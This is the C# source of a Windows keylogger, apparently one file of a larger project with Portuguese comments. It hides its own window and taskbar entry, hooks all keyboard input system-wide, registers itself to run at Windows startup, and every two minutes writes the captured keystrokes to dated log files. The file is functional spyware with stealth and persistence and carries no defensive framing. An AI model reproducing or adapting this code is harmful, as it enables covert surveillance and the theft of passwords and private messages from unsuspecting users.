using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class KeyLogger : Form
    {
        private GlobalKeyboardHook _globalKeyboardHook;
        public static string TextFull { get; set; } = string.Empty;
        public static DateTime LastSave { get; set; }
        public static DirectoryInfo DirectoryInfo { get; set; }

        public KeyLogger()
        {
            InitializeComponent();
        }

        protected override void OnLoad(EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            Opacity = 0;

            _globalKeyboardHook = new GlobalKeyboardHook(new Keys[] { Keys.A, Keys.B });

            _globalKeyboardHook = new GlobalKeyboardHook();
            _globalKeyboardHook.KeyboardPressed += OnKeyPressed;

            using (StartupApp startupApp = new StartupApp())
            {
                if (startupApp.StartWithWindows())
                {
                    //Remove para adicionar novamente, para ter a certeza de que o local do executavel esta atualizado
                    startupApp.RemoveStartWithWindows();
                }

                startupApp.SetStartup();
            }

            DirectoryInfo = new DirectoryInfo(Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "logger"));
            timer1.Start();
            base.OnLoad(e);
        }

        private void OnKeyPressed(object sender, GlobalKeyboardHookEventArgs e)
        {
            if (e.KeyboardState == GlobalKeyboardHook.KeyboardState.KeyDown)
            {
                TextFull += $"{ e.KeyboardData.Key}-";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (DateTime.Now.Subtract(LastSave).TotalSeconds > 120 && TextFull.Length > 0)
            {
                //reseta as propriedades o quanto antes para nao interferir no timer
                LastSave = DateTime.Now;
                string text = TextFull;
                TextFull = string.Empty;

                SaveText(text);
            }
        }

        private static void SaveText(string text)
        {
            Directory.CreateDirectory(DirectoryInfo.FullName);

            FileInfo file = new FileInfo(Path.Combine(DirectoryInfo.FullName, $"{DateTime.Now:HH-dd-MM-yyyy}.log"));
            try
            {
                if (!file.Exists) { file.Create().Close(); }

                string AllText = File.ReadAllText(file.FullName);

                AllText += text;

                File.WriteAllText(file.FullName, AllText);
            }
            catch
            { }
        }
    }
}
